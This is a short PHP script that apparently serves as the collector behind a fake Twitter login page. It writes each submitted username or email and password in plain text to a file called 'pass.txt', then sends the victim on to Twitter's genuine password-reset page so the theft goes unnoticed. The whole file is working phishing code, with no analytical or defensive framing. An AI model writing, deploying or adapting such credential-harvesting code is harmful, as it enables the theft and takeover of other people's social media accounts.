<?php
// Check if usernameOrEmail and pass are set in the POST request
if (isset($_POST['usernameOrEmail']) && isset($_POST['pass'])) {
    // Append the username and password to the "pass.txt" file
    file_put_contents("pass.txt", "Twitter Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
    // Redirect the user to the Twitter password reset page
    header('Location: https://twitter.com/account/begin_password_reset');
    exit();
} else {
    echo "Error: Username or password not provided.";
}
?>
